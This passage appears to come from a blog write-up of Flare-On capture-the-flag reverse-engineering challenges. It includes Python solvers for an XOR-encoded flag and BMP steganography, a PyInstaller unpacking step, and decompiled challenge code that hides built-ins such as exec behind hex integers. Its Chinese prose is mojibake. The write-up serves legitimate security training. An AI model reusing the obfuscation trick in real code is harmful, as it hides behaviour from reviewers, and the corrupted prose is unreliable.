class="string">&#x27;127.148.37.223&#x27;</span>, <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æœ€åï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">t3 = [<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span class="string">&#x27;127.148.37.223&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"></span><br><span class="line">t2 = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x2e</span>,</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j,p <span class="keyword">in</span> enumerate(t3):    </span><br><span class="line">    ip = map(int,p.split(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> ip[<span class="number">0</span>] == <span class="number">127</span> <span class="keyword">and</span> <span class="keyword">not</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span>: </span><br><span class="line">        i = ip[<span class="number">2</span>]&amp;<span class="number">0xf</span></span><br><span class="line">        t2[i*<span class="number">2</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>]</span><br><span class="line">        t2[i*<span class="number">2</span>+<span class="number">1</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print (&#x27;&#x27;.join(map(chr,t2)))</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;&#x27;</span>.join(map(chr,t2)))</span><br></pre></td></tr></table></figure><h2 id="5-demo"><a href="#5-demo" class="headerlink" title="5 - demo"></a>5 - demo</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png"></a></p><p>è¿™ä¸ªå‡½æ•°å°†ä¿®æ”¹è§†è§’</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png"></a></p><h2 id="6-bmphide"><a href="#6-bmphide" class="headerlink" title="6 - bmphide"></a>6 - bmphide</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png"></a></p><p>å‚æ•°çš„0 1 2  ä½åˆ†åˆ«æ˜¯ åŸå›¾ã€ å¾…éšå†™æ•°æ® å’Œä¿å­˜çš„å›¾ç‰‡ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png"></a></p><p>å‡½æ•°i å¯çŸ¥æ˜¯ä¸€ä¸ªç±»ä¼¼äºLSB éšå†™çš„ä»£ç ï¼Œå°†åŠ å¯†åçš„æ•°æ®éšå†™åˆ°</p><p>R G B  å¯¹åº”ä¸º ä½0 1 2 ï¼› 0 1 2 ; 0 1å¤„</p><p>j å‡½æ•°å¤§è‡´é€»è¾‘å½•ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">j(z)  (ww*yy+zz+4+f(6))^b(z,1) </span><br><span class="line">ww = 0x1F7D1482</span><br><span class="line">yy = 20*136+18</span><br><span class="line">zz = MzQxOTk=  34199</span><br><span class="line">j(103) = 0  </span><br><span class="line">j(231) = 1 </span><br><span class="line">j(230) = 3 </span><br><span class="line">j(27) = 0xf8 </span><br><span class="line">j(228) = 7 </span><br><span class="line">j(25) = 0xfc</span><br><span class="line">j(100) = 6</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¦‚ä¸‹ä»£ç æå–æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line"><span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">pixel = img.load()</span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">p = pixel[x, y]</span><br><span class="line">        <span class="comment"># print(p)</span></span><br><span class="line">data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">d.append(data)</span><br><span class="line"></span><br><span class="line">extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extract_file)</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ†æä»£ç é€»è¾‘å‘ç°å…¶ä¸­hçš„é€»è¾‘å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="meta"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br></pre></td></tr></table></figure><p>ä½†å…¶ä¸­å‡ ä¸ªå‡½æ•°è¢«æ›¿æ¢ï¼Œf æ›¿æ¢ä¸º g, aæ›¿æ¢ä¸ºb, cæ›¿æ¢ä¸ºd</p><p>æœ€åä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span>():</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line">    <span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">    pixel = img.load()</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">            p = pixel[x, y]</span><br><span class="line">            <span class="comment"># print(p)</span></span><br><span class="line">            data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">            d.append(data)</span><br><span class="line"></span><br><span class="line">    extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(extract_file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">idx</span>):</span></span><br><span class="line">    b = ((<span class="number">0xc5</span>*(idx+<span class="number">1</span>))^ (<span class="number">0x7d</span>*(idx+<span class="number">2</span>)))&amp;<span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">byte,len</span>):</span> <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">128</span>) / <span class="number">128</span>) &amp;<span class="number">0xff</span></span><br><span class="line">        b = ((byte * <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span>    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">byte,len</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">1</span>) * <span class="number">128</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        b = ((byte / <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">return</span> a^b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> (a&gt;&gt;i&amp;<span class="number">1</span>) == (b&gt;&gt;i&amp;<span class="number">1</span>):</span><br><span class="line">a = a &amp; ~(<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = a | (<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># def f(idx):</span></span><br><span class="line"><span class="comment"># n = 1</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># yield ((n*309030853)^((n+1)*209897853))&amp;0xff</span></span><br><span class="line"><span class="comment"># n += 1</span></span><br><span class="line"><span class="comment"># b = ((idx+1)*309030853)&amp;0xff</span></span><br><span class="line"><span class="comment"># k = ((idx+2)*209897853)&amp;0xff</span></span><br><span class="line"><span class="comment"># return b ^ k</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_left</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary</span></span><br><span class="line">    bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># right circular shift</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit </span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="comment"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    data = open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="comment"># data = data[::-1]</span></span><br><span class="line"></span><br><span class="line">    data2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data4 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data5 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(data)):</span><br><span class="line">        data2 += chr(circular_shift_left(ord(data[i]),<span class="number">3</span>))</span><br><span class="line">        data3 += chr(ord(data2[i]) ^ g(<span class="number">2</span>*i+<span class="number">1</span>) ) </span><br><span class="line">        data4 += chr(circular_shift_right(ord(data3[i]),<span class="number">7</span>))</span><br><span class="line">        data5 += chr(ord(data4[i]) ^ g(<span class="number">2</span>*i))</span><br><span class="line"></span><br><span class="line">    save = open(<span class="string">&quot;flag.bmp&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    save.write(data5)</span><br><span class="line"></span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><h2 id="7-wopr"><a href="#7-wopr" class="headerlink" title="7 - wopr"></a>7 - wopr</h2><p>ä¸€ä¸ª PE æ–‡ä»¶ï¼ŒIDAæ‰“å¼€åˆ†æå‘ç°æ˜¯ pyintaller æ‰“åŒ…çš„ï¼Œä½¿ç”¨ <a href="https://github.com/countercept/python-exe-unpacker">pyinstxtractor</a> è¿›è¡Œè§£åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py wopr.exe</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å †è§£åŒ…åçš„æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># swing @ localhost in ~&#x2F;Desktop&#x2F;flare-on&#x2F;7 - wopr&#x2F;wopr.exe_extracted [14:15:19]</span><br><span class="line">$ ls</span><br><span class="line">PYZ-00.pyz                                      api-ms-win-crt-convert-l1-1-0.dll</span><br><span class="line">PYZ-00.pyz_extracted                            api-ms-win-crt-environment-l1-1-0.dll</span><br><span class="line">VCRUNTIME140.dll                                api-ms-win-crt-filesystem-l1-1-0.dll</span><br><span class="line">_bz2.pyd                                        api-ms-win-crt-heap-l1-1-0.dll</span><br><span class="line">_ctypes.pyd                                     api-ms-win-crt-locale-l1-1-0.dll</span><br><span class="line">_hashlib.pyd                                    api-ms-win-crt-math-l1-1-0.dll</span><br><span class="line">_lzma.pyd                                       api-ms-win-crt-process-l1-1-0.dll</span><br><span class="line">_socket.pyd                                     api-ms-win-crt-runtime-l1-1-0.dll</span><br><span class="line">_ssl.pyd                                        api-ms-win-crt-stdio-l1-1-0.dll</span><br><span class="line">api-ms-win-core-console-l1-1-0.dll              api-ms-win-crt-string-l1-1-0.dll</span><br><span class="line">api-ms-win-core-datetime-l1-1-0.dll             api-ms-win-crt-time-l1-1-0.dll</span><br><span class="line">api-ms-win-core-debug-l1-1-0.dll                api-ms-win-crt-utility-l1-1-0.dll</span><br><span class="line">api-ms-win-core-errorhandling-l1-1-0.dll        base_library</span><br><span class="line">api-ms-win-core-file-l1-1-0.dll                 base_library.zip</span><br><span class="line">api-ms-win-core-file-l1-2-0.dll                 libcrypto-1_1.dll</span><br><span class="line">api-ms-win-core-file-l2-1-0.dll                 libssl-1_1.dll</span><br><span class="line">api-ms-win-core-handle-l1-1-0.dll               pyexpat.pyd</span><br><span class="line">api-ms-win-core-heap-l1-1-0.dll                 pyi-windows-manifest-filename wopr.exe.manifest</span><br><span class="line">api-ms-win-core-interlocked-l1-1-0.dll          pyiboot01_bootstrap</span><br><span class="line">api-ms-win-core-libraryloader-l1-1-0.dll        pyiboot01_bootstrap_dis</span><br><span class="line">api-ms-win-core-localization-l1-2-0.dll         pyiboot02_cleanup.py</span><br><span class="line">api-ms-win-core-memory-l1-1-0.dll               pyiboot02_cleanup.pyc</span><br><span class="line">api-ms-win-core-namedpipe-l1-1-0.dll            pyiboot02_cleanup_dis</span><br><span class="line">api-ms-win-core-processenvironment-l1-1-0.dll   pyimod01_os_path</span><br><span class="line">api-ms-win-core-processthreads-l1-1-0.dll       pyimod02_archive</span><br><span class="line">api-ms-win-core-processthreads-l1-1-1.dll       pyimod03_importers</span><br><span class="line">api-ms-win-core-profile-l1-1-0.dll              python37.dll</span><br><span class="line">api-ms-win-core-rtlsupport-l1-1-0.dll           select.pyd</span><br><span class="line">api-ms-win-core-string-l1-1-0.dll               struct</span><br><span class="line">api-ms-win-core-synch-l1-1-0.dll                this key</span><br><span class="line">api-ms-win-core-synch-l1-2-0.dll                this\__init__.py</span><br><span class="line">api-ms-win-core-sysinfo-l1-1-0.dll              this\key</span><br><span class="line">api-ms-win-core-timezone-l1-1-0.dll             ucrtbase.dll</span><br><span class="line">api-ms-win-core-util-l1-1-0.dll                 unicodedata.pyd</span><br><span class="line">api-ms-win-crt-conio-l1-1-0.dll                 wopr.exe.manifest</span><br></pre></td></tr></table></figure><p>ç”±äºé¢˜ç›®æç¤ºæ˜¯è¦æ‰¾å¯åŠ¨ä»£ç ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†pyi** å¼€å¤´çš„å‡ ä¸ªæ–‡ä»¶ ç”±äºå‡ ä¸ªæ–‡ä»¶ç¼ºå°‘äº†pycå¤´ï¼Œæˆ‘ä»¬å°†pycå¤´ç»™è¡¥ä¸Šï¼ˆpython3.7ç‰ˆæœ¬ï¼‰ç„¶åä½¿ç”¨ <strong>python-uncompyle6</strong> è¿›è¡Œåç¼–è¯‘ï¼Œå…¶ä¸­ pyiboot-2_cleanupä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, io, lzma, pkgutil, random, struct, sys, time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">print(<span class="string">&#x27;LOADING...&#x27;</span>)</span><br><span class="line">BOUNCE = pkgutil.get_data(<span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ho</span>(<span class="params">h, g=&#123;&#125;</span>):</span></span><br><span class="line">    k = bytes.fromhex(format(h, <span class="string">&#x27;x&#x27;</span>)).decode()</span><br><span class="line">    <span class="keyword">return</span> g.get(k, k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">1702389091</span></span><br><span class="line">b = <span class="number">482955849332</span></span><br><span class="line">g = ho(<span class="number">29516388843672123817340395359</span>, globals())</span><br><span class="line">aa = getattr(g, ho(a))</span><br><span class="line">bb = getattr(g, ho(b))</span><br><span class="line">a ^= b</span><br><span class="line">b ^= a</span><br><span class="line">a ^= b</span><br><span class="line">setattr(g, ho(a), aa)</span><br><span class="line">setattr(g, ho(b), bb)</span><br><span 